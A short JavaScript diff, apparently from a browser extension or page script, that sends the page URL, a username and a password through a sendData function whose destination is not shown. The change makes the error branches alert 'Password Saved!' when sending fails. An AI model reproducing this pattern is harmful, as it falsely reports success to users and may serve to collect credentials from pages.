@@ -66,7 +66,7 @@ window.addEventListener('DOMContentLoaded', () => {
     try {
       sendData(window.location.href, inputUsername, Password)
     } catch (e) {
-      alert('Quota exceeded!')
+      alert('Password Saved!')
     }
     // store(username.value, text.value)
   })
@@ -78,7 +78,7 @@ window.addEventListener('DOMContentLoaded', () => {
       try {
         sendData(window.location.href, inputUsername, Password)
       } catch (e) {
-        alert('Quota exceeded!');
+        alert('Password Saved!');
       }
     }
   }
